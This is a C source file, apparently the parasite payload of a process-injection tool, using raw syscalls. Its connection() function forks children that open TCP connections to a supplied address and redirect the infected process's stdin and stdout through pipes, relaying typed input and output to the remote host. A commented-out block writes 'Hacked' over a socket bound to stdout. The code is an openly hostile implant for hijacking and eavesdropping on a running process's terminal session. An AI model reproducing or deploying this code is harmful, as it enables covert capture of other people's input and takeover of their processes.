#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdarg.h>
#include <time.h>
#include <fcntl.h>

#include "syscall.h"
#include "string.c"
#include "parasite.h"
#include "infect-rpc.h"

#define NULL ((void *)0)

int connection(void *data){
	char st[] = "print(\"HELLO\")\n";
	int pid, pid2;
	int size = 0;
/*
	int sock;
	struct sockaddr_in *sockaddr = data;

	
	sock = sys_socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

	sys_connect(sock, (struct sockaddr *) sockaddr, sizeof(*sockaddr));

	sys_close(1);
	sys_dup2(sock, 1);
	sys_write(1, "Hacked\n", sizeof("Hacked\n"));
*/
	int fds[2], fds2[2];
	sys_pipe2(fds, O_CLOEXEC);
	pid = sys_fork();
	if(pid == 0){
		sys_close(fds[1]);
		sys_close(0);
		sys_dup2(fds[0], 0);
		sys_close(fds[0]);
		char buf[32];
		struct sockaddr_in *sockaddr = data;
		int sock;
		sock = sys_socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		sys_connect(sock, (struct sockaddr *) sockaddr, sizeof(*sockaddr));
		
		while(1){
			memset(buf, 0, sizeof(buf));
			size = sys_read(0, buf, sizeof(buf));
			if(size < 0)
				break;
			sys_write(sock, buf, sizeof(buf));
			sys_write(1, buf, sizeof(buf));
		}
	}else{
		sys_close(fds[0]);
		sys_close(1);
		sys_dup2(fds[1], 1);
		sys_close(fds[1]);

		sys_pipe2(fds2, O_CLOEXEC);
		pid2 = sys_fork();
		if(pid2 == 0){
			char buf[32];
			sys_close(fds2[0]);
			struct sockaddr_in *sockaddr = data;
			int sock;
			sock = sys_socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
			sys_connect(sock, (struct sockaddr *) sockaddr, sizeof(*sockaddr));	
			while(1){
				memset(buf, 0, sizeof(buf));

				for(int i = 0, size = 0; i < sizeof(buf); i++){
					size += sys_read(0, &buf[i], sizeof(char));
					sys_write(1, &buf[i], 1);
					if(buf[i] == '\r'){
						buf[i] = '\n';
						sys_write(1, "\n", 1);
					//	sys_write(sock, buf, i + 1);
						sys_write(fds2[1], buf, i + 1);
						break;
					}
/*					std_printf("%c\n", buf[i]);

					if(buf[i] == '\0' || buf[i] == '\n'){
						buf[i] = '\n';
						break;
					}
					*/
				}

				if(size < 0)
					break;
			}
		}else{
			sys_close(0);
			sys_close(fds2[1]);
			sys_dup2(fds2[0], 0);
			sys_close(fds2[0]);
		}

	}
/*
	char outpath[] = "/hey";
	char inpath[] = "/b.tmp";
	int outfd = sys_open(outpath, O_RDWR);

	sys_dup2(outfd, 1);

	sys_close(outfd);
	
	int infd = sys_open(inpath, O_RDWR);

	sys_dup2(infd, 0);
*/
/*
 * This is multi process for writing
 */
/*	struct timespec tp;
	tp.tv_sec = 5;
	tp.tv_nsec = 0;
	pid = sys_fork();
	if(pid == 0){
		while(1){
			sys_write(0, st, 15); 
			sys_nanosleep(&tp, NULL);
		}
	}
*/


	return 0;
}
